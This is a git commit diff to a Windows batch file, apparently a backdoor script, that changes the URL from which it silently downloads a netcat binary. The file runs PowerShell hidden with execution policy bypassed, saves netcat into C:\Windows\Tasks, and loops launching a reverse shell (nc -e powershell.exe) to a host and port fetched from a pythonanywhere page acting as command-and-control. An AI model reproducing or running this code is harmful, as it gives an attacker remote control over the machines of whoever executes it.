8129db7aa23a27ce53de9e1f34cfce5aab0b1f4e
xxNighthoodxx <87844789+xxNighthoodxx@users.noreply.github.com>
2023-01-28 00:02:32 +0530

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,5 +1,5 @@
 @echo off
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\Premier.exe"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Invoke-WebRequest https://github.com/RAF-87/win-back-cat/blob/master/files/nc.exe?raw=true -OutFile C:\\Windows\\Tasks\\Premier.exe"
 :x
 powershell -c "C:\\Windows\\Tasks\\nc.exe -e powershell.exe ([System.Net.Dns]::GetHostAddresses((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[0]).IPAddressToString[1]) ((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[1])"
 powershell -c "C:\\Windows\\Tasks\\nc.exe -e powershell.exe ([System.Net.Dns]::GetHostAddresses((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[0]).IPAddressToString) ((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[1])"
